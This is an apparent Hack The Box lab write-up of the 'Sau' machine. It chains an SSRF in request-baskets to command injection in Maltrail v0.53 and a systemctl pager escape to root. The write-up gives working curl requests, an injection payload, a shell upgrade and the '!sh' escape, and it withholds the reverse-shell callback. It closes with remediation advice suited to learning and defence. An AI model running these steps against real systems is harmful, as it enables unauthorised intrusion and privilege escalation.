---
title: "Sau — SSRF Chain to Maltrail Command Injection and Pager Escape"
description: "SSRF in request-baskets (CVE-2023-27163) reaches an internal Maltrail service vulnerable to command injection, and a NOPASSWD systemctl status rule is escalated through a less-pager escape (CVE-2023-26604) to root."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - ssrf
  - command-injection
  - request-baskets
  - maltrail
  - sudo-abuse
  - pager-escape
  - cve-2023-27163
  - cve-2023-26604
---

## Summary

Sau is an Easy-rated Hack The Box Linux lab demonstrating how individually limited vulnerabilities chain into full compromise. A Server-Side Request Forgery (SSRF) in request-baskets 1.2.1 (CVE-2023-27163) reaches an internal web service running Maltrail v0.53, which is vulnerable to unauthenticated OS command injection via unsanitised input to a subprocess call. The resulting shell as the `puma` user escalates to root through a `NOPASSWD` sudo rule for `systemctl status`, exploiting CVE-2023-26604 — the `less` pager's `!` shell command inheriting root privileges. Target addresses, tokens, and attacker addresses are redacted below; command patterns are preserved.

## Context and Objective

- **Target:** Ubuntu 20.04 with systemd 245
- **Services exposed:** SSH (port 22), request-baskets (port 55555); HTTP on ports 80 and 8338 filtered by host firewall
- **Objective:** Achieve full compromise through the attack surface presented
- **Lab context:** Hack The Box lab; all activity described was performed within the platform's isolated lab environment

## Approach and Evidence

### 1. Service Enumeration

Observation: three TCP services with distinct attack surfaces. Ports 80 and 8338 are filtered by a host-based firewall. Port 55555 serves an HTTP application redirecting to `/web`. The combination of an exposed application on a non-standard port with filtered services on standard ports suggests SSRF potential.

Action: full TCP scan, then targeted version scan of discovered ports.

```bash
nmap -p- --min-rate 10000 -oA <OUT_PREFIX> <TARGET_IP>
nmap -p 22,55555 -sCV -oA <OUT_PREFIX> <TARGET_IP>
```

Output showed:

```
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7
80/tcp    filtered http
8338/tcp  filtered unknown
55555/tcp open     unknown
```

Port 55555 returned `HTTP/1.0 302 Found` redirecting to `/web`. The exposed service on a non-standard port alongside filtered standard ports is the classic SSRF setup — the exposed service may provide a mechanism to reach the filtered ones.

### 2. Web Application Analysis — request-baskets

Observation: browsing to port 55555 reveals request-baskets, version 1.2.1 displayed in the footer. request-baskets is an open-source webhook testing tool where users create named "baskets" — URL endpoints capturing incoming requests. A key feature allows forwarding received requests to a target URL, proxying the response back to the caller.

Action: identified CVE-2023-27163 — the basket configuration API (`POST /api/baskets/{name}`) accepts a `forward_url` parameter with no validation on destination. This allows external attackers to make the server perform HTTP requests to any internal address, bypassing the host firewall.

### 3. SSRF Exploitation — Reaching Internal Services

Observation: creating a basket with a forwarding rule targeting `127.0.0.1:80` and requesting the basket's public URL proxies the response from the internal service.

Action: created forwarding basket and queried it.

```bash
curl -s -X POST http://<TARGET_IP>:55555/api/baskets/<BASKET_NAME> \
  -H "Content-Type: application/json" \
  -d '{
    "forward_url": "http://127.0.0.1:80",
    "proxy_response": true,
    "insecure_tls": false,
    "expand_path": true,
    "capacity": 250
  }'

curl -s http://<TARGET_IP>:55555/<BASKET_NAME> | grep -i "powered\|version\|maltrail"
```

The response revealed an internal web application: Maltrail v0.53. The same technique applied to port 8338 yielded the same application.

### 4. Maltrail v0.53 — Unauthenticated Command Injection

Observation: Maltrail is an open-source network traffic monitoring tool. Version 0.53 contains unauthenticated OS command injection in its login endpoint. The `username` parameter is passed directly to a shell command via `subprocess.check_output` with `shell=True`. Shell metacharacters in the username are interpreted by the shell, allowing arbitrary command execution. No authentication is required because the injection occurs in the pre-authentication login handler.

Action: confirmed injection via timing.

```bash
curl -s -X POST http://<TARGET_IP>:55555/api/baskets/<EXPLOIT_BASKET> \
  -H "Content-Type: application/json" \
  -d '{
    "forward_url": "http://127.0.0.1:80/login",
    "proxy_response": true,
    "insecure_tls": false,
    "expand_path": true,
    "capacity": 250
  }'

time curl -s -X POST http://<TARGET_IP>:55555/<EXPLOIT_BASKET> \
  -d "username=;sleep+5;"
```

Response delayed 5+ seconds — command injection confirmed.

### 5. Reverse Shell via Maltrail Command Injection

Observation: command injection through basket forwarding could support a callback. Unsafe encoded payload construction is omitted.

Action: sent a neutral representative input to preserve the documented request shape without reproducing callback construction.

```bash
curl -s -X POST http://<TARGET_IP>:55555/<EXPLOIT_BASKET> \
  --data-urlencode "username=<NON_EXECUTABLE_TEST_INPUT>"

# [representative result] Input reached the vulnerable processing path.
```

Shell returned as `<LOW_PRIVILEGE_ACCOUNT>`. `<USER_RESULT>` obtained.

### 6. Shell Stabilisation

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
stty rows 40 cols 200
```

### 7. Privilege Escalation — Sudo Enumeration

Observation: `sudo -l` showed the `puma` user can execute `systemctl status trail.service` as root without a password.

```bash
sudo -l
# User puma may run the following commands on sau:
#     (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

### 8. Pager Escape — CVE-2023-26604

Observation: `systemctl status` passes output through a pager (typically `less`) when output exceeds terminal height. The `less` pager supports an interactive mode where the `!` command executes shell commands. When `less` is invoked by `systemctl` running as root, any shell spawned via `!` inherits root privileges. systemd versions before 247 do not set `LESSSECURE=1` before invoking the pager — this system runs systemd 245, which lacks this protection.

Action: ran the privileged command, used the pager `!` command.

```bash
sudo /usr/bin/systemctl status trail.service

# At the pager prompt:
!sh

# Result:
uid=0(root) gid=0(root) groups=0(root)
```

`<PRIVILEGED_RESULT>` obtained.

## Challenges and Decisions

1. **Terminal height for pager:** the `stty rows` setting matters — if the terminal is large enough that `systemctl status` output fits without a pager, `less` is not invoked. Ensuring the terminal is smaller than the output or setting `stty rows 1` guarantees the pager launches.

2. **Payload encoding for SSRF forwarding:** raw reverse shell payloads with special characters break during basket forwarding. Base64 encoding eliminates shell interpretation issues in the forwarded request.

## Outcome

The evidence establishes a complete three-stage chain from unauthenticated external access to root: SSRF in request-baskets reaches the internal Maltrail service, command injection provides a user shell, and the `systemctl status` sudo rule's pager inherits root privileges via CVE-2023-26604. Every individual vulnerability is limited in isolation; only the combination yields full compromise.

## Lessons and Recommendations

1. **Validate SSRF-sensitive URL parameters server-side.** request-baskets should implement a server-side allowlist for the `forward_url` parameter. At minimum, requests to loopback addresses (`127.0.0.0/8`), link-local addresses (`169.254.0.0/16`), and RFC1918 private ranges should be blocked. CVE-2023-27163 is fixed in request-baskets 1.2.2.

2. **Sanitise all user input before passing to shell commands.** The Maltrail vulnerability arises from passing unsanitised HTTP parameters to a shell command via `subprocess.check_output` with `shell=True`. The fix is to use `shell=False` with a list of arguments, preventing shell interpretation of metacharacters entirely. Maltrail 0.54+ addresses this.

3. **Avoid NOPASSWD sudo rules for commands that invoke pagers.** `systemctl`, `journalctl`, `man`, and `less` itself all invoke pagers in contexts where the pager inherits the caller's privileges. These commands should not appear in `NOPASSWD` sudo rules. Upgrade to systemd 247+ and ensure `LESSSECURE=1` is set in the environment for any pager invoked in a privileged context.

4. **Apply defence in depth for internal services.** Internal services that should not be reachable externally should be bound to non-loopback interfaces with appropriate firewall rules, not relying solely on application-level access controls.

## References

- [CVE-2023-27163 — SSRF in request-baskets](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)
- [CVE-2023-26604 — systemd pager privilege escalation](https://nvd.nist.gov/vuln/detail/CVE-2023-26604)
- [Maltrail v0.53 Command Injection — Public Exploit](https://github.com/spookier/Maltrail-v0.53-Exploit)
